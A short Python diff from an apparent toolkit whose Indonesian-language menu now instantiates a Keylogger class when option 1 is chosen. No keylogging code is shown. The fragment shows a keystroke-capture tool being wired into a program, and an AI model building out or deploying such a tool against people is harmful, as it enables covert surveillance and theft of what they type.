@@ -76,9 +76,7 @@ class Main:
 
         pilihan = input("Silahkan pilih menu yang ada di atas : ")
         if pilihan == '1':
-            pass
-        elif pilihan == '2':
-            keylogger = Keylogger()
+            keylogger = Keylogger()           
             
                 
 if __name__ == '__main__':
